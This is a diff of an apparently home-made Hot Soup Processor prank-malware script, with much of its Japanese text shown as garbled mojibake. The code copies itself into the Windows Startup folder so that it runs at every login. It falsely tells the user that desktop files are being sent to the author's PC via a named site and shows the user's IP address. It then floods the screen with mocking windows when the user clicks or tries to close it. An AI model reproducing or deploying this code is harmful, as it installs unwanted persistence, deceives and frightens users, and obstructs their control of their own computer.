@@ -2,10 +2,7 @@
 	#include "Hspsock.as"
 	filepath=dir_exe
 	deskpath=dir_desktop
-	//startuppath=dirinfo($10018)
 	startuppath=dirinfo(0x10007)
-	//xcopy "F:\users\eno\desktop\Programs\HSP Projects\ƒEƒCƒ‹ƒX‚à‚Ç‚«" "C:\Users\eno\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hello" /I /E /D /C
-	//xcopy dir_exe startup
 	exec "xcopy"+" \""+filepath+"\" \""+startuppath+"\\hello\" /I /E /D /C"
 	wait 1
 	cl=0
@@ -17,13 +14,10 @@
 	gsel 0,2				
 	
 	ipget
-	title "ƒf[ƒ^‚ğ“]‘—‚µ‚Ä‚¢‚Ü‚·c"
-	mes dir_desktop+"‚Ìƒf[ƒ^‚ğhttps://enoki.xyz‚ğ’Ê‚¶‚Ä‚¦‚Ì‚«‚ÌPC‚ÉƒRƒs[‚µ‚Ä‚¢‚Ü‚·c"
-	mes "•Â‚¶‚æ‚¤‚Æ‚µ‚Ä‚à–³‘Ê‚Å‚·A‚©‚©‚Á‚Ä‚«‚È‚³‚¢"
-	mes "‚ ‚È‚½‚ÌIPƒAƒhƒŒƒX:"+refstr
-	//mes filepath
-;	WM_LBUTTONDOWN (ƒ}ƒEƒX‚Ì¶ƒNƒŠƒbƒN‚³‚ê‚½)
-;	onclick gosub *lbuttondown
+	title "ãƒ‡ãƒ¼ã‚¿ã‚’è»¢é€ã—ã¦ã„ã¾ã™â€¦"
+	mes dir_desktop+"ã®ãƒ‡ãƒ¼ã‚¿ã‚’https://enoki.xyzã‚’é€šã˜ã¦ãˆã®ãã®PCã«ã‚³ãƒ”ãƒ¼ã—ã¦ã„ã¾ã™â€¦"
+	mes "é–‰ã˜ã‚ˆã†ã¨ã—ã¦ã‚‚ç„¡é§„ã§ã™ã€ã‹ã‹ã£ã¦ããªã•ã„"
+	mes "ã‚ãªãŸã®IPã‚¢ãƒ‰ãƒ¬ã‚¹:"+refstr
 	onexit gosub *DestroyWindow
 	
 	while
@@ -40,8 +34,8 @@
 	stop
 
 *lbuttondown
-;	1=¶ƒ{ƒ^ƒ“A3=‰Eƒ{ƒ^ƒ“+¶ƒ{ƒ^ƒ“A5=ShiftƒL[+¶ƒ{ƒ^ƒ“A
-;	9=CtrlƒL[+¶ƒ{ƒ^ƒ“
+;	1=å·¦ãƒœã‚¿ãƒ³ã€3=å³ãƒœã‚¿ãƒ³+å·¦ãƒœã‚¿ãƒ³ã€5=Shiftã‚­ãƒ¼+å·¦ãƒœã‚¿ãƒ³ã€
+;	9=Ctrlã‚­ãƒ¼+å·¦ãƒœã‚¿ãƒ³
 	AAA+=5
 	BBB=AAA+1
 	CCC=BBB+1
@@ -50,37 +44,37 @@
 	screen AAA,800,140,4
 	gsel AAA,2				
 	width 0,0,rnd(1920),rnd(1080)
-	font "ƒƒCƒŠƒI",rnd(64)+9
-	mes "‚´‚Ü‚ www"
-	title "‚´‚Ü‚ www"
+	font "ãƒ¡ã‚¤ãƒªã‚ª",rnd(64)+9
+	mes "ã–ã¾ã‚www"
+	title "ã–ã¾ã‚www"
 	wait 1
 	screen BBB,500,500,4
 	gsel BBB,2				
 	width 0,0,rnd(1920),rnd(1080)
-	font "ƒƒCƒŠƒI",rnd(64)+9
-	mes "‚´‚Ü‚ www"
-	title "‚´‚Ü‚ www"
+	font "ãƒ¡ã‚¤ãƒªã‚ª",rnd(64)+9
+	mes "ã–ã¾ã‚www"
+	title "ã–ã¾ã‚www"
 	wait 1
 	screen CCC,300,600,4
 	gsel CCC,2				
 	width 0,0,rnd(1920),rnd(1080)
-	font "ƒƒCƒŠƒI",rnd(64)+9
-	mes "‚´‚Ü‚ www"
-	title "‚´‚Ü‚ www"
+	font "ãƒ¡ã‚¤ãƒªã‚ª",rnd(64)+9
+	mes "ã–ã¾ã‚www"
+	title "ã–ã¾ã‚www"
 	wait 1
 	screen DDD,200,470,4
 	gsel DDD,2				
 	width 0,0,rnd(1920),rnd(1080)
-	font "ƒƒCƒŠƒI",rnd(64)+9
-	mes "‚´‚Ü‚ www"
-	title "‚´‚Ü‚ www"
+	font "ãƒ¡ã‚¤ãƒªã‚ª",rnd(64)+9
+	mes "ã–ã¾ã‚www"
+	title "ã–ã¾ã‚www"
 	wait 1
 	screen EEE,500,300,4
 	gsel EEE,2				
 	width 0,0,rnd(1920),rnd(1080)
-	font "ƒƒCƒŠƒI",rnd(64)+9
-	mes "‚´‚Ü‚ www"
-	title "‚´‚Ü‚ www"
+	font "ãƒ¡ã‚¤ãƒªã‚ª",rnd(64)+9
+	mes "ã–ã¾ã‚www"
+	title "ã–ã¾ã‚www"
 	wait 1
 	AAA+=5
 	BBB=AAA+1
@@ -90,124 +84,124 @@
 	screen AAA,800,140,4
 	gsel AAA,2				
 	width 0,0,rnd(1920),rnd(1080)
-	font "ƒƒCƒŠƒI",rnd(64)+9
-	mes "‚´‚Ü‚ www"
-	title "‚´‚Ü‚ www"
+	font "ãƒ¡ã‚¤ãƒªã‚ª",rnd(64)+9
+	mes "ã–ã¾ã‚www"
+	title "ã–ã¾ã‚www"
 	wait 1
 	screen BBB,500,500,4
 	gsel BBB,2				
 	width 0,0,rnd(1920),rnd(1080)
-	font "ƒƒCƒŠƒI",rnd(64)+9
-	mes "‚´‚Ü‚ www"
-	title "‚´‚Ü‚ www"
+	font "ãƒ¡ã‚¤ãƒªã‚ª",rnd(64)+9
+	mes "ã–ã¾ã‚www"
+	title "ã–ã¾ã‚www"
 	wait 1
 	screen CCC,300,600,4
 	gsel CCC,2				
 	width 0,0,rnd(1920),rnd(1080)
-	font "ƒƒCƒŠƒI",rnd(64)+9
-	mes "‚´‚Ü‚ www"
-	title "‚´‚Ü‚ www"
+	font "ãƒ¡ã‚¤ãƒªã‚ª",rnd(64)+9
+	mes "ã–ã¾ã‚www"
+	title "ã–ã¾ã‚www"
 	wait 1
 	screen DDD,200,470,4
 	gsel DDD,2				
 	width 0,0,rnd(1920),rnd(1080)
-	font "ƒƒCƒŠƒI",rnd(64)+9
-	mes "‚´‚Ü‚ www"
-	title "‚´‚Ü‚ www"
+	font "ãƒ¡ã‚¤ãƒªã‚ª",rnd(64)+9
+	mes "ã–ã¾ã‚www"
+	title "ã–ã¾ã‚www"
 	wait 1
 	screen EEE,500,300,4
 	gsel EEE,2				
 	width 0,0,rnd(1920),rnd(1080)
-	font "ƒƒCƒŠƒI",rnd(64)+9
-	mes "‚´‚Ü‚ www"
-	title "‚´‚Ü‚ www"
+	font "ãƒ¡ã‚¤ãƒªã‚ª",rnd(64)+9
+	mes "ã–ã¾ã‚www"
+	title "ã–ã¾ã‚www"
 	wait 1
 
 	return
 
 
 *DestroyWindow
-;	ƒoƒcƒ{ƒ^ƒ“‚ª‰Ÿ‚³‚ê‚½‚Ì‰Šú‰»
-;	‰½‚à‚µ‚È‚¢
+;	ãƒãƒ„ãƒœã‚¿ãƒ³ãŒæŠ¼ã•ã‚ŒãŸæ™‚ã®åˆæœŸåŒ–
+;	ç…½ã‚‹
 
 	screen FFF,800,140,4
 	gsel FFF,2				
 	width 0,0,rnd(1920),rnd(1080)
-	font "ƒƒCƒŠƒI",rnd(64)+9
-	mes "ƒoƒc‚¶‚á•Â‚¶‚ê‚È‚¢‚æwww"
-	title "ƒoƒc‚¶‚á•Â‚¶‚ê‚È‚¢‚æwww"
+	font "ãƒ¡ã‚¤ãƒªã‚ª",rnd(64)+9
+	mes "ãƒãƒ„ã˜ã‚ƒé–‰ã˜ã‚Œãªã„ã‚ˆwww"
+	title "ãƒãƒ„ã˜ã‚ƒé–‰ã˜ã‚Œãªã„ã‚ˆwww"
 	wait 1
 	FFF+=1
 	screen FFF,800,140,4
 	gsel FFF,2				
 	width 0,0,rnd(1920),rnd(1080)
-	font "ƒƒCƒŠƒI",rnd(64)+9
-	mes "ƒoƒc‚¶‚á•Â‚¶‚ê‚È‚¢‚æwww"
-	title "ƒoƒc‚¶‚á•Â‚¶‚ê‚È‚¢‚æwww"
+	font "ãƒ¡ã‚¤ãƒªã‚ª",rnd(64)+9
+	mes "ãƒãƒ„ã˜ã‚ƒé–‰ã˜ã‚Œãªã„ã‚ˆwww"
+	title "ãƒãƒ„ã˜ã‚ƒé–‰ã˜ã‚Œãªã„ã‚ˆwww"
 	wait 1
 	FFF+=1
 	screen FFF,800,140,4
 	gsel FFF,2				
 	width 0,0,rnd(1920),rnd(1080)
-	font "ƒƒCƒŠƒI",rnd(64)+9
-	mes "ƒoƒc‚¶‚á•Â‚¶‚ê‚È‚¢‚æwww"
-	title "ƒoƒc‚¶‚á•Â‚¶‚ê‚È‚¢‚æwww"
+	font "ãƒ¡ã‚¤ãƒªã‚ª",rnd(64)+9
+	mes "ãƒãƒ„ã˜ã‚ƒé–‰ã˜ã‚Œãªã„ã‚ˆwww"
+	title "ãƒãƒ„ã˜ã‚ƒé–‰ã˜ã‚Œãªã„ã‚ˆwww"
 	wait 1
 	FFF+=1
 	screen FFF,800,140,4
 	gsel FFF,2				
 	width 0,0,rnd(1920),rnd(1080)
-	font "ƒƒCƒŠƒI",rnd(64)+9
-	mes "ƒoƒc‚¶‚á•Â‚¶‚ê‚È‚¢‚æwww"
-	title "ƒoƒc‚¶‚á•Â‚¶‚ê‚È‚¢‚æwww"
+	font "ãƒ¡ã‚¤ãƒªã‚ª",rnd(64)+9
+	mes "ãƒãƒ„ã˜ã‚ƒé–‰ã˜ã‚Œãªã„ã‚ˆwww"
+	title "ãƒãƒ„ã˜ã‚ƒé–‰ã˜ã‚Œãªã„ã‚ˆwww"
 	wait 1
 	FFF+=1
 	screen FFF,800,140,4
 	gsel FFF,2				
 	width 0,0,rnd(1920),rnd(1080)
-	font "ƒƒCƒŠƒI",rnd(64)+9
-	mes "ƒoƒc‚¶‚á•Â‚¶‚ê‚È‚¢‚æwww"
-	title "ƒoƒc‚¶‚á•Â‚¶‚ê‚È‚¢‚æwww"
+	font "ãƒ¡ã‚¤ãƒªã‚ª",rnd(64)+9
+	mes "ãƒãƒ„ã˜ã‚ƒé–‰ã˜ã‚Œãªã„ã‚ˆwww"
+	title "ãƒãƒ„ã˜ã‚ƒé–‰ã˜ã‚Œãªã„ã‚ˆwww"
 	wait 1
 	FFF+=1
 	screen FFF,800,140,4
 	gsel FFF,2				
 	width 0,0,rnd(1920),rnd(1080)
-	font "ƒƒCƒŠƒI",rnd(64)+9
-	mes "ƒoƒc‚¶‚á•Â‚¶‚ê‚È‚¢‚æwww"
-	title "ƒoƒc‚¶‚á•Â‚¶‚ê‚È‚¢‚æwww"
+	font "ãƒ¡ã‚¤ãƒªã‚ª",rnd(64)+9
+	mes "ãƒãƒ„ã˜ã‚ƒé–‰ã˜ã‚Œãªã„ã‚ˆwww"
+	title "ãƒãƒ„ã˜ã‚ƒé–‰ã˜ã‚Œãªã„ã‚ˆwww"
 	wait 1
 	FFF+=1
 	screen FFF,800,140,4
 	gsel FFF,2				
 	width 0,0,rnd(1920),rnd(1080)
-	font "ƒƒCƒŠƒI",rnd(64)+9
-	mes "ƒoƒc‚¶‚á•Â‚¶‚ê‚È‚¢‚æwww"
-	title "ƒoƒc‚¶‚á•Â‚¶‚ê‚È‚¢‚æwww"
+	font "ãƒ¡ã‚¤ãƒªã‚ª",rnd(64)+9
+	mes "ãƒãƒ„ã˜ã‚ƒé–‰ã˜ã‚Œãªã„ã‚ˆwww"
+	title "ãƒãƒ„ã˜ã‚ƒé–‰ã˜ã‚Œãªã„ã‚ˆwww"
 	wait 1
 	FFF+=1
 	screen FFF,800,140,4
 	gsel FFF,2				
 	width 0,0,rnd(1920),rnd(1080)
-	font "ƒƒCƒŠƒI",rnd(64)+9
-	mes "ƒoƒc‚¶‚á•Â‚¶‚ê‚È‚¢‚æwww"
-	title "ƒoƒc‚¶‚á•Â‚¶‚ê‚È‚¢‚æwww"
+	font "ãƒ¡ã‚¤ãƒªã‚ª",rnd(64)+9
+	mes "ãƒãƒ„ã˜ã‚ƒé–‰ã˜ã‚Œãªã„ã‚ˆwww"
+	title "ãƒãƒ„ã˜ã‚ƒé–‰ã˜ã‚Œãªã„ã‚ˆwww"
 	wait 1
 	FFF+=1
 	screen FFF,800,140,4
 	gsel FFF,2				
 	width 0,0,rnd(1920),rnd(1080)
-	font "ƒƒCƒŠƒI",rnd(64)+9
-	mes "ƒoƒc‚¶‚á•Â‚¶‚ê‚È‚¢‚æwww"
-	title "ƒoƒc‚¶‚á•Â‚¶‚ê‚È‚¢‚æwww"
+	font "ãƒ¡ã‚¤ãƒªã‚ª",rnd(64)+9
+	mes "ãƒãƒ„ã˜ã‚ƒé–‰ã˜ã‚Œãªã„ã‚ˆwww"
+	title "ãƒãƒ„ã˜ã‚ƒé–‰ã˜ã‚Œãªã„ã‚ˆwww"
 	wait 1
 	FFF+=1
 	screen FFF,800,140,4
 	gsel FFF,2				
 	width 0,0,rnd(1920),rnd(1080)
-	font "ƒƒCƒŠƒI",rnd(64)+9
-	mes "ƒoƒc‚¶‚á•Â‚¶‚ê‚È‚¢‚æwww"
-	title "ƒoƒc‚¶‚á•Â‚¶‚ê‚È‚¢‚æwww"
+	font "ãƒ¡ã‚¤ãƒªã‚ª",rnd(64)+9
+	mes "ãƒãƒ„ã˜ã‚ƒé–‰ã˜ã‚Œãªã„ã‚ˆwww"
+	title "ãƒãƒ„ã˜ã‚ƒé–‰ã˜ã‚Œãªã„ã‚ˆwww"
 	wait 1
 	FFF+=1
 return
